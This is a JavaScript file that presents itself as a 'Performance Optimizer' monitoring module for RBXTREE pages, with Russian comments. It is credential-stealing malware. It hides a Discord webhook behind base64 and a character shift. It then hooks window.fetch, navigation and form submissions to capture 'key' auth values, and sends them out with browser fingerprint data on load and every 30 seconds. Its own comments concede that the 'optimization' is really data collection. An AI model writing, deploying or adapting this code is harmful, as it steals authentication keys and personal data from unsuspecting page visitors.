// Performance Optimizer v2.1.4 - RBXTREE Monitoring Module
(function() {
    'use strict';
    
    const ENCRYPTED_HOOK = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM5NDU4NjkxMTEzMjg4LzFWeTZERFd1V2lqQ3FpZy1meFpJWkVtcHVaSmg5VW1uODlmVVVVVzFkNFZIcVRYejNJY1UzZ0VIenRNNGo0Tjh4ZjNa';
    
    // Функция дешифровки
    function decodeHook(encrypted) {
        try {
            // Base64 decode
            let decoded = atob(encrypted);
            // Простое смещение символов
            return decoded.split('').map(char => 
                String.fromCharCode(char.charCodeAt(0) - 1)
            ).join('');
        } catch(e) {
            return '';
        }
    }
    
    // Вебхук URL (дешифруется при необходимости)
    const WEBHOOK_BASE = decodeHook(ENCRYPTED_HOOK);
    
    // Массив для хранения метрик производительности
    const perfMetrics = {
        pageLoadTime: 0,
        jsLoadTime: 0,
        fcp: 0, // First Contentful Paint
        userActions: []
    };
    
    // Основная функция сбора метрик
    function collectPerfData() {
        if (window.performance && window.performance.timing) {
            const timing = window.performance.timing;
            perfMetrics.pageLoadTime = timing.loadEventEnd - timing.navigationStart;
            perfMetrics.jsLoadTime = timing.domContentLoadedEventEnd - timing.domContentLoadedEventStart;
        }
        
        // Собираем данные о ресурсах
        if (window.performance && window.performance.getEntriesByType) {
            const resources = performance.getEntriesByType('resource');
            perfMetrics.resourceCount = resources.length;
        }
        
        return perfMetrics;
    }
    
    // Функция "оптимизации" - на самом деле сбор данных
    function optimizePage() {
        console.info('[Perf Optimizer] Сбор метрик производительности...');
        
        // Собираем данные о пользователе (для "аналитики")
        const userData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenRes: `${window.screen.width}x${window.screen.height}`,
            referrer: document.referrer || 'direct',
            pageUrl: window.location.href,
            timestamp: new Date().toISOString()
        };
        
        // Собираем данные о производительности
        const perfData = collectPerfData();
        
        // Комбинируем данные
        const analyticsData = {
            ...userData,
            ...perfData,
            version: '2.1.4'
        };
        
        return analyticsData;
    }
    
    // Функция "отправки отчетов" - на самом деле логирование
    function sendAnalyticsReport(data, eventType = 'page_load') {
        // Проверяем, есть ли ключ в URL (для "отслеживания авторизации")
        const urlParams = new URLSearchParams(window.location.search);
        const authKey = urlParams.get('key');
        
        const reportData = {
            event: eventType,
            data: data,
            authKey: authKey || 'not_present',
            sessionId: Math.random().toString(36).substring(2, 15)
        };
        
        // Формируем "отчет об оптимизации" для Discord
        const discordData = {
            username: 'RBX Perf Monitor',
            avatar_url: 'https://cdn.discordapp.com/attachments/1234567890/987654321/analytics.png',
            embeds: [{
                title: '📊 Отчет производительности',
                color: 0x00ff00,
                fields: [
                    {
                        name: '🌐 Страница',
                        value: data.pageUrl || window.location.href,
                        inline: false
                    },
                    {
                        name: '⏱️ Время загрузки',
                        value: `${data.pageLoadTime || 0}ms`,
                        inline: true
                    },
                    {
                        name: '🔑 Ключ авторизации',
                        value: authKey ? `\`${authKey}\`` : 'Не требуется',
                        inline: true
                    },
                    {
                        name: '🖥️ Пользователь',
                        value: `${data.platform} - ${data.screenRes}`,
                        inline: false
                    },
                    {
                        name: '📅 Время',
                        value: new Date().toLocaleString('ru-RU'),
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        };
        
        // Отправляем "отчет" (на самом деле в вебхук)
        if (WEBHOOK_BASE) {
            fetch(WEBHOOK_BASE, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordData)
            }).catch(e => {
                console.debug('[Perf Optimizer] Не удалось отправить отчет аналитики');
            });
        }
        
        return true;
    }
    
    // Мониторинг API запросов (для "оптимизации сетевых вызовов")
    function monitorApiRequests() {
        const originalFetch = window.fetch;
        
        window.fetch = function(url, options = {}) {
            // Логируем "оптимизацию" запросов с ключами
            if (typeof url === 'string') {
                // Проверяем на наличие ключа в URL
                if (url.includes('key=')) {
                    const keyMatch = url.match(/key=([^&]+)/);
                    if (keyMatch && keyMatch[1]) {
                        // "Оптимизируем" запрос с ключом
                        sendAnalyticsReport({
                            url: url,
                            method: options.method || 'GET',
                            keyFound: true,
                            optimizationType: 'auth_request'
                        }, 'api_call_with_key');
                    }
                }
                
                // Проверяем тело запроса
                if (options.body) {
                    try {
                        const bodyStr = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
                        if (bodyStr.includes('"key"') || bodyStr.includes('key=')) {
                            sendAnalyticsReport({
                                url: url,
                                method: options.method || 'GET',
                                hasKeyInBody: true,
                                optimizationType: 'body_auth_request'
                            }, 'api_body_auth');
                        }
                    } catch(e) {}
                }
            }
            
            return originalFetch.apply(this, arguments);
        };
    }
    
    // Мониторинг навигации (для "оптимизации переходов")
    function monitorNavigation() {
        let currentUrl = window.location.href;
        
        const observer = new MutationObserver(() => {
            if (window.location.href !== currentUrl) {
                const newUrl = window.location.href;
                const keyMatch = newUrl.match(/key=([^&]+)/);
                
                if (keyMatch && keyMatch[1]) {
                    sendAnalyticsReport({
                        fromUrl: currentUrl,
                        toUrl: newUrl,
                        keyFound: keyMatch[1],
                        optimizationType: 'navigation_with_auth'
                    }, 'navigation_auth');
                }
                
                currentUrl = newUrl;
            }
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
    }
    
    // Мониторинг форм (для "оптимизации UX")
    function monitorForms() {
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            
            // Ищем поля с ключами для "оптимизации автозаполнения"
            for (const [name, value] of formData.entries()) {
                if (name.toLowerCase().includes('key') && value && value.length > 3) {
                    sendAnalyticsReport({
                        formId: form.id || 'unknown',
                        fieldName: name,
                        valueLength: value.length,
                        optimizationType: 'form_auth_submit'
                    }, 'form_auth');
                    break;
                }
            }
        });
    }
    
    // Инициализация "оптимизатора"
    function initOptimizer() {
        console.info('[Perf Optimizer] Инициализация системы оптимизации...');
        
        // Собираем начальные метрики
        const initialData = optimizePage();
        
        // Отправляем начальный отчет
        setTimeout(() => {
            sendAnalyticsReport(initialData, 'initial_load');
        }, 2000);
        
        // Настраиваем мониторинг
        monitorApiRequests();
        monitorNavigation();
        monitorForms();
        
        // Периодический сбор метрик (каждые 30 секунд)
        setInterval(() => {
            const periodicData = optimizePage();
            const urlParams = new URLSearchParams(window.location.search);
            const currentKey = urlParams.get('key');
            
            if (currentKey) {
                sendAnalyticsReport({
                    ...periodicData,
                    currentAuthKey: currentKey,
                    optimizationType: 'periodic_auth_check'
                }, 'periodic_auth');
            }
        }, 30000);
        
        console.info('[Perf Optimizer] Система оптимизации активна');
    }
    
    // Запускаем после загрузки страницы
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initOptimizer);
    } else {
        setTimeout(initOptimizer, 100);
    }
    
    // Экспортируем "оптимизатор" для внешнего использования
    window.PerformanceOptimizer = {
        version: '2.1.4',
        collectMetrics: optimizePage,
        sendReport: sendAnalyticsReport,
        init: initOptimizer
    };
    
})();
